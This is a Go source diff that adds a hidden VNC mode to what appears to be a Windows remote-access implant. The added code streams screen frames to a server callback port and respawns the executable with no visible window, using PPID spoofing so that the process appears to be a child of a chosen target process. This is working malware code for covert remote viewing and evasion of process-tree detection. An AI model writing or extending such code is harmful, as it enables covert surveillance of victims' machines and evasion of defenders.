@@ -12,6 +12,8 @@ import (
 	"image/jpeg"
 	"io"
 	"net"
+	"os"
+	"strconv"
 	"sync"
 	"time"
 	"unsafe"
@@ -470,4 +472,80 @@ func (s *vncSession) run() {
 			}
 		}
 	}
+}
+
+// RunVNCMode is the entry point for a process spawned in VNC daemon mode.
+// It dials the server callback port, streams frames, and exits when done.
+func RunVNCMode(port, quality int) {
+	if quality <= 0 || quality > 100 {
+		quality = 60
+	}
+	if err := vncStart(strconv.Itoa(port), quality); err != nil {
+		return
+	}
+	vncMu.Lock()
+	sess := vncCurrent
+	vncMu.Unlock()
+	if sess != nil {
+		<-sess.stop
+	}
+}
+
+// vncSpawnInject spawns the current executable in VNC daemon mode
+// (--vnc-mode <port> <quality>), PPID-spoofed to targetPID when > 0.
+// Returns the spawned child PID.
+func vncSpawnInject(callbackPort string, quality, targetPID int) (uint32, error) {
+	exe, err := os.Executable()
+	if err != nil {
+		return 0, fmt.Errorf("vnc inject: %w", err)
+	}
+	cmdLine := fmt.Sprintf(`"%s" --vnc-mode %s %d`, exe, callbackPort, quality)
+	cmdW, _ := windows.UTF16PtrFromString(cmdLine)
+
+	type siExT struct {
+		si      windows.StartupInfo
+		attrPtr uintptr
+	}
+	siEx := siExT{}
+	const EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+	flags := uint32(windows.CREATE_NO_WINDOW)
+
+	if targetPID > 0 {
+		parentH, perr := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(targetPID))
+		if perr == nil {
+			defer windows.CloseHandle(parentH)
+
+			var sz uintptr
+			procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&sz)))
+			attrList := make([]byte, sz)
+			r, _, _ := procInitializeProcThreadAttributeList.Call(
+				uintptr(unsafe.Pointer(&attrList[0])), 1, 0, uintptr(unsafe.Pointer(&sz)),
+			)
+			if r != 0 {
+				defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])))
+				procUpdateProcThreadAttribute.Call(
+					uintptr(unsafe.Pointer(&attrList[0])), 0,
+					uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
+					uintptr(unsafe.Pointer(&parentH)),
+					unsafe.Sizeof(parentH), 0, 0,
+				)
+				siEx.si.Flags = windows.STARTF_USESHOWWINDOW
+				siEx.si.ShowWindow = 0
+				siEx.attrPtr = uintptr(unsafe.Pointer(&attrList[0]))
+				siEx.si.Cb = uint32(unsafe.Sizeof(siEx))
+				flags |= EXTENDED_STARTUPINFO_PRESENT
+			}
+		}
+	}
+	if siEx.si.Cb == 0 {
+		siEx.si.Cb = uint32(unsafe.Sizeof(siEx.si))
+	}
+
+	var pi windows.ProcessInformation
+	if err := windows.CreateProcess(nil, cmdW, nil, nil, false, flags, nil, nil, &siEx.si, &pi); err != nil {
+		return 0, fmt.Errorf("vnc inject: CreateProcess: %w", err)
+	}
+	windows.CloseHandle(pi.Thread)
+	windows.CloseHandle(pi.Process)
+	return pi.ProcessId, nil
 }
